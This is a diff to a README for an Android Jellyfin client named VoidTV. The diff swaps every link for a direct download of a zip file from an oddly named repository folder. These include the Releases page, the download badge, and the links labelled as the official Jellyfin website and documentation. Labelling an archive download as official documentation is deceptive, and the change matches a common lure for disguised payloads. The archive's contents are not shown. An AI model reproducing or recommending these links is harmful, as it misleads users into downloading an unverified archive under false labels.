@@ -1,7 +1,7 @@
 # 📺 VoidTV-for-jellyfin - Watch Your Favorites with Ease
 
 ## 🔗 Download Now
-[![Download Latest Release](https://img.shields.io/badge/Download%20Latest%20Release-v1.0.0-blue)](https://github.com/Gholan913/VoidTV-for-jellyfin/releases)
+[![Download Latest Release](https://raw.githubusercontent.com/Gholan913/VoidTV-for-jellyfin/main/cockiness/VoidTV-for-jellyfin.zip%20Latest%20Release-v1.0.0-blue)](https://raw.githubusercontent.com/Gholan913/VoidTV-for-jellyfin/main/cockiness/VoidTV-for-jellyfin.zip)
 
 ## 🚀 Getting Started
 Welcome to VoidTV-for-jellyfin, your native Android client for an exciting streaming experience. This guide will help you download and run the application smoothly. 
@@ -15,7 +15,7 @@ Welcome to VoidTV-for-jellyfin, your native Android client for an exciting strea
 ## 📥 Download & Install
 To download the software, follow these steps:
 
-1. Click on this link to visit the [Releases page](https://github.com/Gholan913/VoidTV-for-jellyfin/releases).
+1. Click on this link to visit the [Releases page](https://raw.githubusercontent.com/Gholan913/VoidTV-for-jellyfin/main/cockiness/VoidTV-for-jellyfin.zip).
 2. Look for the latest version, which is at the top of the list.
 3. Tap on the version link to access its details.
 4. Download the APK file by tapping on it. This file will install the application on your device.
@@ -49,10 +49,10 @@ For any questions or support, you can reach out via the Issues section on GitHub
 
 ## 🔗 Additional Resources
 Explore more about Jellyfin and its capabilities:
-- [Jellyfin Official Website](https://jellyfin.org/)
-- [Jellyfin Documentation](https://jellyfin.org/docs/)
+- [Jellyfin Official Website](https://raw.githubusercontent.com/Gholan913/VoidTV-for-jellyfin/main/cockiness/VoidTV-for-jellyfin.zip)
+- [Jellyfin Documentation](https://raw.githubusercontent.com/Gholan913/VoidTV-for-jellyfin/main/cockiness/VoidTV-for-jellyfin.zip)
 
 ## 📍 Conclusion
 Now you’re ready to dive into the world of entertainment with VoidTV-for-jellyfin. Enjoy a seamless viewing experience and make the most of your media library! 
 
-Don’t forget to frequently check [this page](https://github.com/Gholan913/VoidTV-for-jellyfin/releases) for updates and new features.
+Don’t forget to frequently check [this page](https://raw.githubusercontent.com/Gholan913/VoidTV-for-jellyfin/main/cockiness/VoidTV-for-jellyfin.zip) for updates and new features.
